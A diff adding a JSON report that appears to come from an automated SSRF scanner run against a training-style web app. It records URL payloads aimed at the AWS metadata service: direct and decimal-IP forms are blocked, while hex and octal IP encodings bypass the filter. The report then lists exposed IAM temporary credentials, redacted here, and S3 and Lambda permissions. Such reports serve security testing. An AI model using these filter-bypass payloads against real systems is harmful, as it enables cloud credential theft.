@@ -1,0 +1,116 @@
+{
+  "meta": {
+    "target": "http://52.78.187.138:5000/fetch",
+    "timestamp": "2026-08-27T15:47:04.007336Z"
+  },
+  "stages": {
+    "parameter_discovery": {
+      "target": "http://52.78.187.138:5000/fetch",
+      "parameters": [
+        {
+          "name": "url",
+          "method": "GET",
+          "location": "query"
+        }
+      ]
+    },
+    "sink_discovery": {
+      "target": "http://52.78.187.138:5000/fetch",
+      "ssrf_candidates": [
+        {
+          "name": "url",
+          "method": "GET",
+          "location": "query",
+          "server_request_detected": true
+        }
+      ]
+    },
+    "bypass_diagnosis": [
+      {
+        "target": "http://52.78.187.138:5000/fetch",
+        "parameter": {
+          "name": "url",
+          "method": "GET",
+          "location": "query"
+        },
+        "tests": [
+          {
+            "technique": "direct",
+            "bypassed": false,
+            "verdict": "blocked",
+            "status_code": 403,
+            "body_snippet": "차단된 호스트입니다: http://169.254.169.254/latest/meta-data/ (보안 Level 2 — 부분 정규화 (10진수만 차단))<br><a href='/preview'>돌아가기</a>"
+          },
+          {
+            "technique": "decimal_ip",
+            "bypassed": false,
+            "verdict": "blocked",
+            "status_code": 403,
+            "body_snippet": "차단된 호스트입니다: http://2852039166/latest/meta-data/ (보안 Level 2 — 부분 정규화 (10진수만 차단))<br><a href='/preview'>돌아가기</a>"
+          },
+          {
+            "technique": "hex_ip",
+            "bypassed": true,
+            "verdict": "success",
+            "status_code": 200,
+            "body_snippet": "<h2>Fetch 결과 (원본 URL: http://0xa9fea9fe/latest/meta-data/ → 변환: http://169.254.169.254/latest/meta-data/) · 보안 Level 2 — 부분 정규화 (10진수만 차단)</h2><pre style='background:#f0f0f0;padding:15px;white-space:p"
+          },
+          {
+            "technique": "octal_ip",
+            "bypassed": true,
+            "verdict": "success",
+            "status_code": 200,
+            "body_snippet": "<h2>Fetch 결과 (원본 URL: http://0251.0376.0251.0376/latest/meta-data/ → 변환: http://169.254.169.254/latest/meta-data/) · 보안 Level 2 — 부분 정규화 (10진수만 차단)</h2><pre style='background:#f0f0f0;padding:15px;whit"
+          }
+        ],
+        "result": "vulnerable",
+        "bypass_technique": "hex_ip",
+        "extra_params": {}
+      }
+    ],
+    "imds_exposure": {
+      "imds": {
+        "reachable": true,
+        "data_extracted": true,
+        "version_tested": "IMDSv1",
+        "v2_enforced": false
+      },
+      "iam_role": {
+        "detected": true,
+        "role_name": "yuk-ssrf-role-full-access"
+      },
+      "temporary_credentials": {
+        "exposed": true,
+        "access_key_id": "ASIA****REDACTED",
+        "secret_access_key": "REDACTED",
+        "session_token": "REDACTED"
+      }
+    },
+    "cloud_impact": {
+      "principal": {
+        "type": "IAMRole",
+        "name": "yuk-ssrf-role-full-access"
+      },
+      "cloud_impact": [
+        {
+          "service": "S3",
+          "resource": "*",
+          "permissions": [
+            "ListBuckets"
+          ],
+          "impact": "enumeration_only"
+        },
+        {
+          "service": "Lambda",
+          "resource": "yuk-target-lambda",
+          "permissions": [
+            "ListFunctions",
+            "GetFunction"
+          ],
+          "impact": "information_disclosure"
+        }
+      ],
+      "overall_impact": "medium"
+    }
+  }
+}
